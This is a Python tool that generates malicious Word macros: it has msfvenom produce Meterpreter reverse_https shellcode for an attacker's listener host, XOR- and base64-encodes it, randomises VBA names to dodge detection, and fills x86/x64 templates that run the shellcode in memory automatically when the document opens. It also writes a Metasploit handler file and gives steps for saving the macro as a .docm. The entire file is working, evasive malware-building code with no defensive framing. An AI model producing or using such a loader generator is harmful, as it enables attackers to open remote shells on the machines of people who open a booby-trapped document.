#!/usr/bin/env python3

import argparse
import base64
import random
import secrets
import string
import subprocess
import sys
from pathlib import Path


ARCH_DEFAULTS = {
    "x86": "windows/meterpreter/reverse_https",
    "x64": "windows/x64/meterpreter/reverse_https",
}


def generate_handler_rc(payload: str, lhost: str, lport: int, output_path: str):
    rc = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set EXITFUNC thread
set ExitOnSession false
exploit -j
"""
    Path(output_path).write_text(rc)
    print(f"[+] Handler resource file: {output_path}", file=sys.stderr)
    print(f"[+] Start handler: msfconsole -q -r {output_path}", file=sys.stderr)


def run_msfvenom(lhost: str, lport: int, payload: str) -> bytes:
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "EXITFUNC=thread",
        "-f", "raw",
    ]
    print(f"[+] Running: {' '.join(cmd)}", file=sys.stderr)
    try:
        res = subprocess.run(cmd, capture_output=True, check=True)
    except FileNotFoundError:
        sys.exit("[-] msfvenom not found in PATH")
    except subprocess.CalledProcessError as e:
        sys.exit(f"[-] msfvenom failed:\n{e.stderr.decode(errors='replace')}")

    sc = res.stdout
    print(f"[+] Generated {len(sc)} bytes of shellcode", file=sys.stderr)
    return sc


def xor_encode(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def vba_string_literal(name: str, value: str, width: int = 80) -> str:
    chunks = [value[i:i + width] for i in range(0, len(value), width)]
    if len(chunks) == 1:
        return f'    {name} = "{chunks[0]}"'
    lines = [f'    {name} = "{chunks[0]}" & _']
    for c in chunks[1:-1]:
        lines.append(f'        "{c}" & _')
    lines.append(f'        "{chunks[-1]}"')
    return "\n".join(lines)


def rand_ident(rng: random.Random, length_range=(6, 11)) -> str:
    length = rng.randint(*length_range)
    first = rng.choice(string.ascii_letters)
    rest = "".join(rng.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest


def unique_names(rng: random.Random, count: int) -> list:
    names = set()
    while len(names) < count:
        names.add(rand_ident(rng))
    return list(names)


VBA_TEMPLATE_X86 = """\
Option Explicit

Private Declare PtrSafe Function {fn_ct} Lib "KERNEL32" Alias "CreateThread" _
    (ByVal SecurityAttributes As Long, ByVal StackSize As Long, _
     ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, _
     ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function {fn_va} Lib "KERNEL32" Alias "VirtualAlloc" _
    (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
     ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function {fn_rmm} Lib "KERNEL32" Alias "RtlMoveMemory" _
    (ByVal lDestination As LongPtr, ByRef sSource As Any, _
     ByVal lLength As Long) As LongPtr

Private Function {fn_b64}(ByVal s As String) As Byte()
    Dim x As Object, n As Object
    Set x = CreateObject("MSXML2.DOMDocument.6.0")
    Set n = x.createElement("b64")
    n.DataType = "bin.base64"
    n.Text = s
    {fn_b64} = n.nodeTypedValue
End Function

Function {fn_main}()
    Dim {v_blob} As String
    Dim {v_key}  As String

{blob_assign}

{key_assign}

    Dim {v_data}() As Byte
    Dim {v_kb}() As Byte
    {v_data} = {fn_b64}({v_blob})
    {v_kb} = {fn_b64}({v_key})

    Dim {v_i} As Long
    For {v_i} = 0 To UBound({v_data})
        {v_data}({v_i}) = {v_data}({v_i}) Xor {v_kb}({v_i} Mod (UBound({v_kb}) + 1))
    Next {v_i}

    Dim {v_addr} As LongPtr
    {v_addr} = {fn_va}(0, UBound({v_data}) + 1, &H3000, &H40)

    Dim {v_c} As Long
    Dim {v_tmp} As Long
    Dim {v_r} As LongPtr
    For {v_c} = 0 To UBound({v_data})
        {v_tmp} = {v_data}({v_c})
        {v_r} = {fn_rmm}({v_addr} + {v_c}, {v_tmp}, 1)
    Next {v_c}

    {v_r} = {fn_ct}(0, 0, {v_addr}, 0, 0, 0)
End Function

Sub Document_Open()
    {fn_main}
End Sub

Sub AutoOpen()
    {fn_main}
End Sub
"""

VBA_TEMPLATE_X64 = """\
Option Explicit

Private Declare PtrSafe Function {fn_ct} Lib "KERNEL32" Alias "CreateThread" _
    (ByVal SecurityAttributes As LongPtr, ByVal StackSize As LongPtr, _
     ByVal StartFunction As LongPtr, ByVal ThreadParameter As LongPtr, _
     ByVal CreateFlags As Long, ByRef ThreadId As LongPtr) As LongPtr

Private Declare PtrSafe Function {fn_va} Lib "KERNEL32" Alias "VirtualAlloc" _
    (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
     ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Sub {fn_rmm} Lib "KERNEL32" Alias "RtlMoveMemory" _
    (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)

Private Function {fn_b64}(ByVal s As String) As Byte()
    Dim x As Object, n As Object
    Set x = CreateObject("MSXML2.DOMDocument.6.0")
    Set n = x.createElement("b64")
    n.DataType = "bin.base64"
    n.Text = s
    {fn_b64} = n.nodeTypedValue
End Function

Function {fn_main}()
    Dim {v_blob} As String
    Dim {v_key}  As String

{blob_assign}

{key_assign}

    Dim {v_data}() As Byte
    Dim {v_kb}() As Byte
    {v_data} = {fn_b64}({v_blob})
    {v_kb} = {fn_b64}({v_key})

    Dim {v_i} As Long
    For {v_i} = 0 To UBound({v_data})
        {v_data}({v_i}) = {v_data}({v_i}) Xor {v_kb}({v_i} Mod (UBound({v_kb}) + 1))
    Next {v_i}

    Dim {v_addr} As LongPtr
    Dim {v_sz} As LongPtr
    {v_sz} = UBound({v_data}) + 1
    {v_addr} = {fn_va}(0, {v_sz}, &H3000, &H40)
    If {v_addr} = 0 Then Exit Function

    {fn_rmm} {v_addr}, {v_data}(0), {v_sz}

    Dim {v_tid} As LongPtr
    Dim {v_r} As LongPtr
    {v_r} = {fn_ct}(0, 0, {v_addr}, 0, 0, {v_tid})
End Function

Sub Document_Open()
    {fn_main}
End Sub

Sub AutoOpen()
    {fn_main}
End Sub
"""

COMMON_KEYS = ["fn_ct", "fn_va", "fn_rmm", "fn_b64", "fn_main",
               "v_blob", "v_key", "v_data", "v_kb", "v_i", "v_addr", "v_r"]

X86_EXTRA_KEYS = ["v_c", "v_tmp"]
X64_EXTRA_KEYS = ["v_sz", "v_tid"]


def build_vba(shellcode: bytes, rng: random.Random, arch: str) -> str:
    key = secrets.token_bytes(16)
    xored = xor_encode(shellcode, key)
    blob_b64 = base64.b64encode(xored).decode()
    key_b64 = base64.b64encode(key).decode()

    extra_keys = X86_EXTRA_KEYS if arch == "x86" else X64_EXTRA_KEYS
    all_keys = COMMON_KEYS + extra_keys
    names = unique_names(rng, len(all_keys))

    mapping = dict(zip(all_keys, names))
    mapping["blob_assign"] = vba_string_literal(mapping["v_blob"], blob_b64)
    mapping["key_assign"] = vba_string_literal(mapping["v_key"], key_b64)

    template = VBA_TEMPLATE_X86 if arch == "x86" else VBA_TEMPLATE_X64
    vba = template.format(**mapping)

    print(f"[+] Arch:            {arch}", file=sys.stderr)
    print(f"[+] XOR key (hex):   {key.hex()}", file=sys.stderr)
    print(f"[+] Main routine:    {mapping['fn_main']}", file=sys.stderr)
    print(f"[+] CreateThread as: {mapping['fn_ct']}", file=sys.stderr)
    return vba


def main():
    ap = argparse.ArgumentParser(description="Build VBA loader (XOR + base64, x86 or x64 meterpreter)")
    ap.add_argument("--arch", choices=["x86", "x64"], required=True,
                    help="Target Office architecture (File -> Account -> About Word)")
    ap.add_argument("--lhost", default=None, help="Listener IP (required unless --shellcode)")
    ap.add_argument("--lport", type=int, default=443, help="Listener port (default 443)")
    ap.add_argument("--payload", default=None,
                    help="Override msfvenom payload (default: meterpreter/reverse_https for arch)")
    ap.add_argument("--shellcode", default=None,
                    help="Path to raw shellcode file (skip msfvenom)")
    ap.add_argument("-o", "--output", default="loader.vba", help="Output .vba path")
    ap.add_argument("--seed", type=int, default=None,
                    help="Seed for identifier randomization (omit for fully random)")
    ap.add_argument("--no-handler", action="store_true",
                    help="Do not generate Metasploit handler .rc file")
    args = ap.parse_args()

    if args.shellcode is None and args.lhost is None:
        ap.error("--lhost is required when not using --shellcode")

    payload = args.payload or ARCH_DEFAULTS[args.arch]
    rng = random.Random(args.seed) if args.seed is not None else random.Random()

    if args.shellcode:
        sc = Path(args.shellcode).read_bytes()
        print(f"[+] Loaded {len(sc)} bytes from {args.shellcode}", file=sys.stderr)
    else:
        sc = run_msfvenom(args.lhost, args.lport, payload)
    vba = build_vba(sc, rng, args.arch)

    Path(args.output).write_text(vba)
    print(f"[+] Wrote {args.output} ({len(vba)} chars)", file=sys.stderr)
    print("[+] Open Word, Alt+F11, paste into ThisDocument, Save as .docm", file=sys.stderr)

    if not args.no_handler and args.shellcode is None:
        rc_path = Path(args.output).stem + "_handler.rc"
        generate_handler_rc(payload, args.lhost, args.lport, rc_path)


if __name__ == "__main__":
    main()
